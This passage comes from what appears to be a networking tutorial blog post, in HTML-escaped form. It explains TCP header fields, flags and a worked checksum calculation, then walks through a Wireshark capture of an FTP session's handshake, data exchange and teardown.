    &lt;p&gt;&lt;strong&gt;SYN&lt;/strong&gt; - as we already saw, the SYN flag used for starting conversation, in the TCP world the starting session end up always with three TCP segments that send back and forth between two parties, because of that this starting point called &lt;strong&gt;Three Way Handshake&lt;/strong&gt;, you will see the three way handshake in every conversion that base on TCP.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;ACK&lt;/strong&gt; - we saw that flag, and if you remember, that flag are resposible for approving that the TCP segment arrived successfully to the other endpoint, but keep in mind that if we get ACK flag activated in the TCP segment it doesn’t mean that the data that arrived doesn’t broken and if you ask what we done with broken data? for that we have the CRC (which is the checksum) and we will see that header as we  move on in this article.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;FIN&lt;/strong&gt; - if you remember in the &lt;strong&gt;Basic TCP Functionality&lt;/strong&gt; section we saw the FIN &amp;amp; ACK session, the FIN is responsible for closing some session, so if one side want to end the TCP session he send a FIN + ACK flags, the ACK is for approved that the previous TCP segment arrived and the FIN is to inporm the other endpoint that we wish to end the session, so the other endpoint will respond with ACK to approved that we get the FIN + ACK that we sent and he with also initiate a FIN + ACK message to end the session too, and then the first endpoint will respond with ACK and that it, the session is ending, just like we saw in figure 5.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;PSH&lt;/strong&gt; - This flag is stand for push which mean that we want to push some data to the other endpoint, so, every time that the TCP contain some DATA in the upper layer, you will see this flag in active state. When the other site get this segment with active PSH he knows that there is a data and he transfer it to the application that expect to this data. We will see some example of that PSH as you keep reading.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;RST&lt;/strong&gt; - This flag is stand for reset, we will see this flag when we have some issue in the connection, or when some side of the parties trying to kill the session, basically if the receiver see that flag he shouldn’t send any message further in that session and discard any further message that he received from the other side that related to that session.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;URG&lt;/strong&gt; - This flag stand for urgent, we use this flag to inform the other side that there is some urgent data that must be treatment immediately, there is more header that related to this flag and specified the urgent data.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Window Size&lt;/strong&gt; - This header used for to inform the other endpoint that we can to buffer some specific amount of data, as example if we send to the other endpoint Window Size of 20000 byte, the other endpoint knows that we can get 20K of data before we sent to him an ACK on the 20K data. Let’s assume that John sent to Bob TCP segment that contain 20K in the window side header, so Bob knows that he can send no more that 20K to John because John can handle only 20K at the time, so if Bob reach to this value he will stop from sending data until he will get some ACK from John about the data Bob was sent, only after that Bob will keep to send more data. Please remember that this is not mean that if John tels Bob about 20K that Bob immediately send 20K stop until the ACK and send again 20K and stop and so on, it’s just let’s Bob knows that he can only handle 20K at the time. We will see in the examples that after two side synchronize they may send small pieces of data as a start, only after that the amount of data may be grow before some ACK will received.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Checksum&lt;/strong&gt; - I think that this header is very cool although this is so old algorithm, this is the way to find an error on the TCP segments, the receiver will check the checksum value against the following calculation, if the value is not the same as the checksum value the TCP segment are discard. The calculation are done as follow:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Pseudo Header&lt;/strong&gt; which is some headers from the IP packets that are include in the checksum calculation. The header are the &lt;strong&gt;Source address&lt;/strong&gt; and &lt;strong&gt;destination address&lt;/strong&gt; from the IP packet with &lt;strong&gt;Reserved&lt;/strong&gt; filed of 8 bit and &lt;strong&gt;Protocol Type&lt;/strong&gt; from IP packet which always be 6 because of the TCP, and &lt;strong&gt;TCP Segment Length&lt;/strong&gt;.
&lt;img src=&quot;/assets/images/pseudo.png&quot; alt=&quot;pseudo&quot; title=&quot;Pseudo&quot; class=&quot;img-responsive&quot; height=&quot;3000px&quot; /&gt;
&lt;strong&gt;Figure 10&lt;/strong&gt; Pseudo Header.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Source Port&lt;/strong&gt; from the TCP segment.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Destination Port&lt;/strong&gt; from the TCP segment.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sequence number&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Acknowledgement number&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Data Offset&lt;/strong&gt; as we discussed, it also called TCP header length&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Reserved&lt;/strong&gt; field from the TCP segment&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Flags&lt;/strong&gt; bits.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Window Size&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Option&lt;/strong&gt; we will discuss this field later in the article.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/checksum.png&quot; alt=&quot;checksum&quot; title=&quot;checksum&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
  &lt;strong&gt;Figure 11&lt;/strong&gt; TCP header for checksum calculation.&lt;/p&gt;

&lt;p&gt;After that we take the all field and add it together, the score need to be in length of 4 digits, and after we put all together we calculate the opposite of what we get, in HEX the calculation will be 15 - n = x, the &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; is the new number we need. We can also calculated as following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;converted the Hex value to binary.&lt;/li&gt;
  &lt;li&gt;change every bit to the opposite which mean &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; become &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; become &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;after the calculation, the value we get in the result this is the checksum value.&lt;/p&gt;

&lt;p&gt;let’s do real check for example:
  &lt;img src=&quot;/assets/images/checksum2.png&quot; alt=&quot;checksum2&quot; title=&quot;checksum2&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
  &lt;strong&gt;Figure 12&lt;/strong&gt; Checksum calculation using Wireshark.&lt;/p&gt;

&lt;p&gt;As you can see the packet that I chose is from some session between my default getaway to one of my hosts. The checksum number is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2aa1&lt;/code&gt;, so let’s check it our self and find the if the checksum we get is the same checksum we calculate.&lt;/p&gt;

&lt;p&gt;So we need to calculate the pseudo, the source address is 10.0.0.138 which in Hex is &lt;code class=&quot;highlighter-rouge&quot;&gt;0a00&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;008a&lt;/code&gt;, the destination address is 10.0.0.6 which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0a00&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0006&lt;/code&gt; now we have 8 reserved bit which in Hex is &lt;strong&gt;00&lt;/strong&gt; and the protocol type is also 8 bit so we have &lt;strong&gt;06&lt;/strong&gt; and together it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;0006&lt;/code&gt;, after that we have TCP segment length in my case it’s 32 bytes so convert that decimal it to Hex we get 20 so we will treat it as &lt;code class=&quot;highlighter-rouge&quot;&gt;0020&lt;/code&gt;.
The source port is 40991 which is &lt;code class=&quot;highlighter-rouge&quot;&gt;a01f&lt;/code&gt; and the destination port is 2869 in Hex is &lt;code class=&quot;highlighter-rouge&quot;&gt;0b35&lt;/code&gt;, the sequence number &lt;code class=&quot;highlighter-rouge&quot;&gt;6d11&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;6aff&lt;/code&gt;, and the acknowledge number is &lt;code class=&quot;highlighter-rouge&quot;&gt;2c1e&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;a2dc&lt;/code&gt;, the data offset, reserved and flags together is &lt;code class=&quot;highlighter-rouge&quot;&gt;8010&lt;/code&gt;, the window size is &lt;code class=&quot;highlighter-rouge&quot;&gt;05b4&lt;/code&gt; and Option is &lt;code class=&quot;highlighter-rouge&quot;&gt;0101&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;080a&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;024c&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;cebf&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;006a&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0e03&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now lets calculate all together:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0a00 + 008a + 0a00 + 0006 + 0006 + 0020 + a01f + 0b35 + 6d11 + 6aff + 2c1e + a2dc + 8010 + 05b4 + 0101 + 080a + 024c + cebf + 006a + 0e03 = 3D55B&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Remember the score is always 4 digits so let’s calculate:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0003 + D55B = D55E&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now let’s calculate what is the opposite number of &lt;strong&gt;D55E&lt;/strong&gt;, we can to that in binary as follow:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;1101 0101 0101 1110&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;-------------------&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;0010 1010 1010 0001&lt;/code&gt;
In Hex is &lt;strong&gt;2AA1&lt;/strong&gt;.
We also can to the following calculation:&lt;br /&gt;
15 - e = 1&lt;br /&gt;
15 - 5 = a&lt;br /&gt;
15 - 5 = a&lt;br /&gt;
15 - d = 2&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Remember what was the checksum?? yes! &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2aa1&lt;/code&gt; so the checksum test for this segment pass successfully!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Urgent Pointer&lt;/strong&gt; - We will see the urgent pointer when the URG flag is active, as I mentioned earlier when one of the sides sent urgent message in that filed we specified what is the length of the urgent data from the start point of the data field. As example let’s open FTP connection to transfer some file, I using 3cdeamon for the FTP server in one of my hosts, and on anouther host I using CMD.&lt;/p&gt;

&lt;p&gt;In one PC I opened CMD and type &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;open 10.0.0.9&lt;/code&gt; and type my user and password and start to copy to my host the test.mp3.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ftp.png&quot; alt=&quot;ftp&quot; title=&quot;ftp&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 13&lt;/strong&gt; opening FTP session in command line.&lt;/p&gt;

&lt;p&gt;After the transfer as start I killed it with &lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+c&lt;/code&gt; which is activate the &lt;strong&gt;URG&lt;/strong&gt; flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ftp5.png&quot; alt=&quot;ftp5&quot; title=&quot;ftp5&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 14&lt;/strong&gt; Killing the FTP session.&lt;/p&gt;

&lt;p&gt;On the other PC you can see that the session has being stopped.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ftp2.png&quot; alt=&quot;ftp2&quot; title=&quot;ftp2&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 15&lt;/strong&gt; FTP session has stopped.&lt;/p&gt;

&lt;p&gt;Now, if we look on the captured file we will see some frame that contain in the TCP segment a URG flag (I have done some filtering so this is why you see only one packet).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ftp3.png&quot; alt=&quot;ftp3&quot; title=&quot;ftp3&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 15&lt;/strong&gt; FTP session has stopped.&lt;/p&gt;

&lt;p&gt;As you can see URG flag is set, if we look at the data we can find a Hex of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xF2&lt;/code&gt; which is in decimal 242 which is the DATA MARK that specified by &lt;a href=&quot;https://tools.ietf.org/html/rfc854&quot;&gt;RFC 854&lt;/a&gt; and it’s the &lt;strong&gt;TCP Urgent notification&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ftp4.png&quot; alt=&quot;ftp4&quot; title=&quot;ftp4&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 16&lt;/strong&gt; TCP Urgent notification.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Option&lt;/strong&gt; - This field contain more optional stuff, that mean the we will see that field typically in the synchronization of two parties, we going to see the real important field in the Option header but ceep in mind that there is more stuff going on.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Maximum Segment Size&lt;/strong&gt; - Typically this field is 4 byte length and it responsible to specified the Maximum Segment Size or more shortly MMS which is the length of the data payload. We will see that MSS typically in the three way handshake, when some site of the parties get this value he knows that the other side can handle and process maximum of data size as specified in the value of the MSS header, as example if John sent to Bob MSS of 1460, Bob knows that in every message that he send to John he can send only up to 1460 byte in each TCP segment.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SACK-permitted&lt;/strong&gt; - This is short for &lt;strong&gt;Selective ACKknowledgment&lt;/strong&gt;, this field is responsible for case of lost data in the TCP connections, if we lost some packets we will announce to the other endpoint of the lost by the SACK field. In the three way handshake we will see that the two side agree to use SACK if they support it. if you want to know exactly what going on in the SACK filed please refer to &lt;a href=&quot;http://packetlife.net/blog/2010/jun/17/tcp-selective-acknowledgments-sack/&quot;&gt;this link&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Timestamps&lt;/strong&gt; - This field are responsible for two value &lt;strong&gt;TSval&lt;/strong&gt; which is Timestamp Value field and is contain the clock value of the timestamp of the TCP that going to be send to the other endpoint. The &lt;strong&gt;TSecr&lt;/strong&gt; which stand for Timestamp Echo Reply field is only valid when ACK flag is set and it’s echo the TSval value we get from the other endpoint, the propose for timestamps is to taking time measurements. You can read more about the if &lt;a href=&quot;https://tools.ietf.org/html/rfc7323#section-3&quot;&gt;RFC 7323&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Window Scale&lt;/strong&gt; - This option is used to increase the maximum window size,
  as you remember the window size value is the way that one side tells to the other what it the maximum byte size that he can handle before we get ACK from him, the Window Scale allow us to increase the window size up to 1 gigabyte if it posible or to decrease the window size value if some congestion had being sense. You can read more about it in &lt;a href=&quot;https://tools.ietf.org/html/rfc1323#section-2&quot;&gt;RFC 1323&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Data&lt;/strong&gt; - This is the actual payload in the TCP segment, this is the data thet one side want to transfer to the other endpoint.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;
The TCP segment structure can be complex to understanding but if you get down to the real detail you will get it, I guarantee you!&lt;/p&gt;

&lt;p&gt;Let’s check what really going on in the realty with some real session.&lt;/p&gt;

&lt;h3 id=&quot;tcp-session-in-real-world&quot;&gt;TCP session in real world.&lt;/h3&gt;

&lt;p&gt;In this section I’ll demonstrate how things are really going on, I have two endpoint so let’s called theme John and Bob. I’m going to use Wireshark and we going to open FTP connection between the two, just remember that FTP session works with two ports, 21 for control session and 20 for data session.&lt;/p&gt;

&lt;p&gt;If you want you can downloads the session &lt;a href=&quot;/assets/downloads/FTP session with ports 21 and 20.pcapng&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So John IP address is 10.0.0.8 and Bob IP address is 10.0.0.5, John want to connect Bob and copy from Bob to his machine some file named test.zip (you can actualy download that file from the sniffer captured file LOL).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap1.png&quot; alt=&quot;cap1&quot; title=&quot;cap1&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 17&lt;/strong&gt; John and Bob.&lt;/p&gt;

&lt;p&gt;John send the first TCP segment to synchronize with Bob, you can see that the source port is 49738 and the destination port is 21 which is the FTP service for control connection, the sequence number is 0 because we doesn’t ever sent any data and the acknowledgement number is 0 also. At the flag area you can see a SYN activated which mean that John want to start the three way handshake for TCP base connection, the window size value is 8192 which mean that John tells Bob he can handle only 8k at the same time we will see how that goes on the session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap2.png&quot; alt=&quot;cap2&quot; title=&quot;cap2&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 18&lt;/strong&gt; Wireshark connection - TCP ports 21 and 20&lt;/p&gt;

&lt;p&gt;The checksum is looking good so it’s great (you can do the calculation the I show you earlier), in the urgent point the value is 0 becouse we have no urgent data at this moment.&lt;/p&gt;

&lt;p&gt;If you expand the option area you will see some value like the MSS that set on 1460 byte which mean that John is willing to get TCP segment data with the maximum of 1460 byte per segment.&lt;/p&gt;

&lt;p&gt;So the starting session look as follow:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap3.png&quot; alt=&quot;cap3&quot; title=&quot;cap3&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 19&lt;/strong&gt; First SYN - Three Way Handshake&lt;/p&gt;

&lt;p&gt;Please remember that because the SYN flag is active this is why we have the 1 phantom bit, so Bob will count it on his response.&lt;/p&gt;

&lt;p&gt;Now Bob going to respond with SYN + ACK flag active and in the acknowledgement number he will specifies &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; because he get sequence of 0 and data of 1 which is the phantom byte, on the sequence number he will specifies &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap4.png&quot; alt=&quot;cap4&quot; title=&quot;cap4&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 20&lt;/strong&gt; Second SYN with ACK - Three Way Handshake&lt;/p&gt;

&lt;p&gt;Let’s look on the captured file, we can see the source port is 21 and the destination is 49738 and the ACK is set to 1 as we expected, Bob activated the SYN and ACK flags and the window size value is also 8K like John, but as you can see the checksum is bed, it should be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x442e&lt;/code&gt; but it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1433&lt;/code&gt;,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap5.png&quot; alt=&quot;cap5&quot; title=&quot;cap5&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 20&lt;/strong&gt; Wireshark second SYN with ACK&lt;/p&gt;

&lt;p&gt;This is happens because of TCP checksum offload, please notice that this error occurs only when Bob packets, well this is because the capture file was taken from Bob machine, so throughout the conversation you will see such an errors only from Bob.&lt;/p&gt;

&lt;p&gt;The key here is that this happens for packets transmitted by the machine doing the capture, not packets received by the machine doing the capture.&lt;/p&gt;

&lt;p&gt;When transmitting a segment the OS fills out every field in the TCP segment in the memory, the checksum field is not computed by the OS, it contains whatever data there was before in that memory location.When we capture with Wireshark, it’s capture the contents of this memory location which contains a TCP segment without a computed checksum it’s have a random data. When the OS sends the segment to the NIC, the NIC hardware then performs the checksum computation, and puts the computed checksum to the particular TCP segment field. This checksum is never seen by the OS or Wireshark. So this is the reason for the errors.&lt;/p&gt;

&lt;p&gt;If you wanna check yourself, just go to this &lt;a href=&quot;https://wiki.wireshark.org/TCP_Checksum_Verification&quot;&gt;link&lt;/a&gt;, you also can remove the TCP check by Wireshark to ignore such an error.&lt;/p&gt;

&lt;p&gt;Let’s go to the next step in the three way handshake, now John going to approved that he get the TCP segment from Bob and this is close up the TCP three way handshake.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap6.png&quot; alt=&quot;cap6&quot; title=&quot;cap6&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 21&lt;/strong&gt; Last ACK - Three Way Handshake&lt;/p&gt;

&lt;p&gt;As you can see the ACK is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; because John get sequence number of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; phantom byte that count as data, the sequence number now is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; as well because John sent in the passed sequence number of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; plus some &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; phantom byte.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap7.png&quot; alt=&quot;cap7&quot; title=&quot;cap7&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 22&lt;/strong&gt; Wireshark last ACK&lt;/p&gt;

&lt;p&gt;The session continue with Bob PSH and ACK flags which tells us that on the TCP payload we will find some data that related to FTP (which in our case Bob tell to John that the service are ready for new user). Meanwhile John get login screen so he need to type some user name.
&lt;img src=&quot;/assets/images/cap8.png&quot; alt=&quot;cap8&quot; title=&quot;cap8&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 23&lt;/strong&gt; Login screen.&lt;/p&gt;

&lt;p&gt;Please notice that Bob sent to John TCP segment with SEQ that equal to 1 and data bytes size of 42.&lt;/p&gt;

&lt;p&gt;John PC respond with ACK about the data that arravied and send another TCP segment that contain a ACK and PSH with data that contain the username guy.
&lt;img src=&quot;/assets/images/cap9.png&quot; alt=&quot;cap9&quot; title=&quot;cap9&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 24&lt;/strong&gt; ACK and PSH with username.&lt;/p&gt;

&lt;p&gt;As you can see the acknowledgement number from John is 43 because the received sequence number is 1 plus the received data in byte is 42, the sequence number however remains the same because John sent sequence number of 1 and data of 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap10.png&quot; alt=&quot;cap10&quot; title=&quot;cap10&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 25&lt;/strong&gt; Sequence and acknowledgement.&lt;/p&gt;

&lt;p&gt;Now Bob response with SYN and PSH active, the ACK is 11 because the received data was 10 and the received sequence was 1, Bob sequence number is 43 related to the sequence number that was sent before bluse the data that was 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap11.png&quot; alt=&quot;cap11&quot; title=&quot;cap11&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 26&lt;/strong&gt; Bob respond again.&lt;/p&gt;

&lt;p&gt;John response with sequence of 11 because he already sent sequence of 1 and 10 data bytes, the acknowledgement number is 76 because John got a data bytes of 33 and sequence number of 43.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap12.png&quot; alt=&quot;cap12&quot; title=&quot;cap12&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 27&lt;/strong&gt; Sequence of 11 and acknowledgement of 76.&lt;/p&gt;

&lt;p&gt;John send more TCP segment with the same values but with data bytes of 13 with password for the FTP session, please note that this is why FTP isn’t secure, the password pass over the net in clear text form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap14.png&quot; alt=&quot;cap14&quot; title=&quot;cap14&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 28&lt;/strong&gt; FTP password in clear text.&lt;/p&gt;

&lt;p&gt;Please remember that this time John send again data so is a PSH plus ACK.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap13.png&quot; alt=&quot;cap13&quot; title=&quot;cap13&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 28&lt;/strong&gt; TCP session continue.&lt;/p&gt;

&lt;p&gt;The acknowledgement and sequence numbers calculate again and Bob send this time ACK of 11 and SEQ of 76, the data bytes are 20 and Bob actually approved that John log in and in the flags are PSH and ACK.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap15.png&quot; alt=&quot;cap15&quot; title=&quot;cap15&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 29&lt;/strong&gt; Bob respond again.&lt;/p&gt;

&lt;p&gt;The acknowledgement that John specifies is 96 and the sequence is 24, this is just ACK so there is no data in this TCP segment. the other packet contain some data in upper layer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap16.png&quot; alt=&quot;cap16&quot; title=&quot;cap16&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 30&lt;/strong&gt; Two TCP segments from John.&lt;/p&gt;

&lt;p&gt;So the session will go in that way, just remember the rules we saw earlier:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The sequence number is the number of &lt;strong&gt;previously sent data&lt;/strong&gt; plus the &lt;strong&gt;previously sent sequence number&lt;/strong&gt; to the other endpoint.&lt;/li&gt;
  &lt;li&gt;The acknowledgement number is the number of the &lt;strong&gt;received data&lt;/strong&gt; plus the &lt;strong&gt;received sequence number&lt;/strong&gt; we get from the other endpoint.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If we make some TCP session that pass through big amount of data we will see the window size and the window scale in action.&lt;/p&gt;

&lt;p&gt;As the session continue you will see the test.zip file transfer to John from Bob, for now I want to jump ahead to packet number 436. In this TCP segment we will see the FIN flag in active form from Bob to John, the flags that are active are FIN, PSH and ACK, the TCP payload is 40 bytes, the sequence number is 234 and acknowledgement number is 67.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap17.png&quot; alt=&quot;cap17&quot; title=&quot;cap17&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 31&lt;/strong&gt; FIN flag.&lt;/p&gt;

&lt;p&gt;The follow TCP segment from John contain just ACK and immediately John send also FIN and ACK segment. The first segment contain values of 275 at ACK number because we got sequence of 234 and more data byte of 40 and we also have phantom byte to count because this is the first the FIN flag is active from Bob side. The sequence number is 67 because of packet 435 that contain sequence number of 67 with data of 0 bytes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap18.png&quot; alt=&quot;cap18&quot; title=&quot;cap18&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 32&lt;/strong&gt; FIN flag is the phantom this time.&lt;/p&gt;

&lt;p&gt;The second packets stay with the same value and the flags as we said are FIN with ACK active.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap19.png&quot; alt=&quot;cap19&quot; title=&quot;cap19&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 33&lt;/strong&gt; FIN flag is the phantom this time.&lt;/p&gt;

&lt;p&gt;Bob respose with ACK and that’s it the session end.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap20.png&quot; alt=&quot;cap20&quot; title=&quot;cap20&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 34&lt;/strong&gt; The ending ACK.&lt;/p&gt;

&lt;p&gt;Let’s look at the diagram to see the numbers in the ending session.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap21.png&quot; alt=&quot;cap21&quot; title=&quot;cap21&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 34&lt;/strong&gt; TCP ending session.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The TCP session contain two rules that we saw every time in the sequence and acknowledge number, the three way handshake is the starting point at TCP session that contain 3 TCP segments, the ending session contain 4 TCP segments that contian FIN flag that stand for finish.&lt;/p&gt;

